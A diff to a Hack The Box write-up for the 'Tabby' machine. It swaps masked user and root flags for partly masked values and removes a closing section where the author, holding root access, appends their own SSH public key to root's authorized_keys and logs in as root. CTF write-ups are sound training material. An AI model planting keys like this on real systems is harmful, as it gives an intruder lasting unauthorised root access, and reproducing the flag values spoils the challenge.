@@ -9,21 +9,10 @@ avatar: assets/htb/tabby.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Tabby
 ---
+
 ## Overview
 
-Short description to include any strange things to be dealt with
-
 TODO: Finish writeup and clean up
-
-## Useful Skills and Tools
-
-#### Useful thing 1
-
-* description with generic example
-
-#### Useful thing 2
-
-* description with generic example
 
 ## Enumeration
 
@@ -527,7 +516,7 @@ drwxr-xr-x 3 ash  ash     4096 Oct 12 19:56 snap
 -rw-r----- 1 ash  ash        0 May 19 11:48 .sudo_as_admin_successful
 -rw-r----- 1 ash  ash       33 Oct 12 19:54 user.txt
 ash@tabby:~$ cat user.txt 
-****
+e33e****2efa
 ```
 
 The zip file seemed to be a dead-end, so I decided to try to use the password I had found on the only user I knew, `ash`, and was able to `su` over to that user!
@@ -652,71 +641,5 @@ ash: ssh: not found
 /mnt/root/root # ls
 root.txt  snap
 /mnt/root/root # cat root.txt 
-****
+2d8c****7ab1
 ```
-
-Even though I had the root flag, I was not convinced that I had actually owned the machine,
-
-```text
-/mnt/root/root # ls -la
-total 40
-drwx------    6 root     root          4096 Jun 16 13:59 .
-drwxr-xr-x   20 root     root          4096 May 19 10:28 ..
-lrwxrwxrwx    1 root     root             9 May 21 20:30 .bash_history -> /dev/null
--rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
-drwx------    2 root     root          4096 May 19 22:23 .cache
-drwxr-xr-x    3 root     root          4096 May 19 11:50 .local
--rw-r--r--    1 root     root           161 Dec  5  2019 .profile
--rw-r--r--    1 root     root            66 May 21 13:46 .selected_editor
-drwx------    2 root     root          4096 Jun 16 14:00 .ssh
--rw-r--r--    1 root     root            33 Oct 12 20:59 root.txt
-drwxr-xr-x    3 root     root          4096 May 19 10:41 snap
-/mnt/root/root # cd .ssh
-/mnt/root/root/.ssh # ls
-authorized_keys  id_rsa           id_rsa.pub
-/mnt/root/root/.ssh # echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYA
-AAAIbmlzdHAyNTYAAABBBJNKfSnisGKKi9utMx0QaRdDaA6OMUdff324/lsfm3Niiqes2/XqzGbIiyO8
-MGa/fifvqNppFIRSbS10PhTojw0= zweilos@kali' >> authorized_keys
-```
-
-so I tried to add my public key and ssh in
-
-```text
-┌──(zweilos㉿kali)-[~/htb/tabby]
-└─$ ssh -i ash.key root@<YOUR_IP>        
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-31-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Mon 12 Oct 2020 11:13:33 PM UTC
-
-  System load:             0.0
-  Usage of /:              34.0% of 15.68GB
-  Memory usage:            44%
-  Swap usage:              0%
-  Processes:               229
-  Users logged in:         1
-  IPv4 address for ens192: <YOUR_IP>
-  IPv4 address for liquid: 10.84.102.1
-  IPv6 address for liquid: fd42:cd51:1c76:426c::1
-  IPv4 address for lxdbr0: 10.192.134.1
-  IPv6 address for lxdbr0: fd42:a03c:fcd2:592f::1
-
-0 updates can be installed immediately.
-0 of these updates are security updates.
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-Last login: Wed Jun 17 21:58:30 2020 from 10.10.14.2
-root@tabby:~# id && hostname
-uid=0(root) gid=0(root) groups=0(root)
-tabby
-```
-
-now I was happy and satisfied that I had truly owned the machine. I was still not entirely happy with how easy the root privesc was, but it was a good learning experience to know to secure members of the `lxd` group!
-
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/tabby-pwn.png)
